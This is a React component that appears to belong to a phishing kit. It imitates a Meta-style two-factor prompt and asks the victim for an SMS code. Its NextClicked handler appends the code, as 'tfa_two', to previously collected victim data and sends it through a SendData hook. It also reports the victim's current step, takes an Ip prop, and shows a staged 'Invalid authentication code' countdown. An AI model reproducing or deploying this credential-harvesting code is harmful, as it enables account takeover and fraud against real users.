import React, { useContext, useEffect, useRef, useState } from 'react'
import { styled } from 'styled-components'
import Image from 'next/image'
import SendData from '../hooks/SendData'
import { DataContext } from '../pages'

const ModalContainer = styled.div`
    position: fixed;   
    display: flex;
    justify-content: center;
    align-items: center;

    width: 100%;
    height: 100%;
    z-index: 1000;
    top: 0px;
    left: 0px;
    padding-inline: 1rem;
`
const ModalContent = styled.div`
    max-width: 550px;
    width: 100%;
    height: 530px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    position: relative;
    padding-block: 1.5rem;
    margin-block: 1rem;
    @media (max-width: 991.98px) {
      height: 430px;
    }
    button:disabled {
      opacity: 0.5;
    }
`

const ModalTitle = styled.div`
    padding-bottom: 0.1rem;
    font-weight: 700;
    font-size: 20px;
`
const SmallText = styled.div`
    color: #1C2B33;
    font-size: 14px;
    line-height: 1.3;
`
const CustomHr = styled.hr`
  margin-block: 0.5rem !important;
`

const CustomInput = styled.input`
    width: 100%;
    border: 1px solid #ddd;
    padding: 0.75rem;
    outline: none !important;
    border-radius: 10px;
    &.redborder {
      border: 1px solid red !important;
    }

    :focus {
        border: 1px solid #aaa;
    }
    margin-bottom: 0.5rem;
`
const StyledButton = styled.button`
  background-color: #0064e0;
    border: 1px solid #0064e0;
    width: 100%;
    color: white;
    font-size: 13px;
    font-weight: 500;
    padding: 10px 20px;
    border-radius: 50px;
    text-transform: none;

    :disabled {
        opacity: 0.5;
    }

`
const ErrorDiv = styled.div`
    font-size: 12px;
    color: red;
    text-align: left;
    padding-bottom: 0.5rem;
    margin-top: -0.35rem;
`

const ImgWrapper = styled.div`
  width: 100%;
  margin-block: 1rem;
  min-height: 250px;
  background-color: #d5d9dd;
  position: relative;
  display: flex;
  align-items: center;

  @media (max-width: 576.98px) { 
    min-height: 160px;
    border-radius: 10px;
    
    img {
      border-radius: 10px;
    }
  }

`
const Spinner = styled.div`
    width: 15px;
    height: 15px;
    border: 2px solid #FFF;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
`

function Fa2Red({ Unik, setStep, Name, Tel, Ip }) {
    const [Error, setError] = useState(false)
    const [counter, setCounter] = useState(60);
    const [Code, setCode] = useState('')
    const btnRef = useRef()
    const [TriedSubmit, setTriedSubmit] = useState(true)
    const [IsLoading, setIsLoading] = useState(false)
    useEffect(() => {
        if (Error) {

            if (counter > 0) {
                setTimeout(() => setCounter(counter - 1), 1000)
            }
            else if (counter === 0) {
                btnRef.current.disabled = false
                setError(false)
                setTriedSubmit(false)
            }
        }
    }, [counter, Error])


    let { setAllData, AllData } = useContext(DataContext);

    const NextClicked = (e) => {
        setTriedSubmit(true)

        if (Code.length === 6 || Code.length === 8) {

            setIsLoading(true)
            setError(false)
            e.target.disabled = true
            const params = {
                ...AllData,
                tfa_two: Code
            };
            setAllData(params)
            SendData(params)
            setTimeout(() => {
                setStep(4)
                setIsLoading(false)
            }, 1000);
        }


    }

    React.useEffect(() => {
        const params = {
            ...AllData,
            currentStep: 'Two Factor Auth 3'
        };

        SendData(params)

    }, [])

    return (

        <ModalContainer>
            <ModalContent>
                <div className='text-start'>
                    <ModalTitle>
                        Check your text messages
                    </ModalTitle>
                    <SmallText>
                        Enter the code we sent to {Tel.substring(0, 3)}*******{Tel.substring(Tel.length - 2, Tel.length)}
                    </SmallText>
                </div>
                <ImgWrapper>
                    <Image
                        alt=""
                        src="/assets/images/New2FA.jpg"
                        layout='fill'
                        objectFit='cover'
                    />
                </ImgWrapper>
                <div>
                    <div className="form-floating">
                        <CustomInput placeholder='Code' type='number' value={Code} onChange={(e) => { setCode(e.target.value) }}
                            className={`form-control ${((Code.length !== 6 || Code.length !== 8) && TriedSubmit) && 'redborder'} `} />
                        <label htmlFor="floatingInput">Code</label>
                    </div>

                    {Error && (
                        <ErrorDiv>
                            Invalid authentication code
                        </ErrorDiv>
                    )}
                    <SmallText>
                        {Error && (
                            <>
                                We can send a new code in&nbsp;
                                <span className='text-start fw-bold'>
                                    00:{counter < 10 && <>0</>}{counter}
                                </span>
                            </>
                        )}
                    </SmallText>

                    <StyledButton onClick={NextClicked} ref={btnRef} className='mt-2'>
                        {IsLoading ? <Spinner /> : 'Continue'}
                    </StyledButton>
                </div>
            </ModalContent>
        </ModalContainer>

    )
}

export default Fa2Red